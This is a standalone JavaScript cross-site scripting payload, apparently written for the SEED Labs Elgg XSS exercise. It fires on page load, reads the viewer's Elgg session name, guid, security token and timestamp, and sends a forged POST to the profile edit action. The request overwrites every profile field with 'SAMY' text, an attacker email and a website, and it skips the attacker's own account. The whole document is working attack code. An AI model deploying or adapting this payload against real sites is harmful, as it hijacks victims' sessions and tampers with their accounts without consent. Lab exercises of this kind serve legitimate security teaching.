<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
    var name_of_user = elgg.session.user.name;
     
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var guid_of_user ="&guid="+elgg.session.user.guid;

    var description = "&description=SAMY's student id is 59";	
    var briefdescription = "&briefdescription=SAMY says \" I modify your profile \" ";
    var location = "&location=SAMY says \" I modify your profile \" ";
    var interests = "&interests=SAMY says \" I modify your profile \" ";
    var skills = "&skills=SAMY says \" I modify your profile \" ";
    var contactemail = "&contactemail=samy01@gmail.com";
    var phone = "&phone=SAMY says \" I modify your profile \" ";
    var mobile = "&mobile=SAMY says \" I modify your profile \" ";
    var website = "&website=http://www.SAMY-server.com";
    var twitter = "&twitter=SAMY says \" I modify your profile \" ";

    var guid_of_samy=59;
    //Construct the content of your url.
    var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
	var content = token + ts + name_of_user + description + "&accesslevel[description]=1" + briefdescription + "&accesslevel[briefdescription]=1" + location + "&accesslevel[location]=1" + interests + "&accesslevel[interests]=1" + skills + "&accesslevel[skills]=1" + contactemail + "&accesslevel[contactemail]=1" + phone + "&accesslevel[phone]=1" + mobile + "&accesslevel[mobile]=1" + website + "&accesslevel[website]=1" + twitter + "&accesslevel[twitter]=1" + guid_of_user; //FILL IN

	if(elgg.session.user.guid!= guid_of_samy)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}

	}
</script>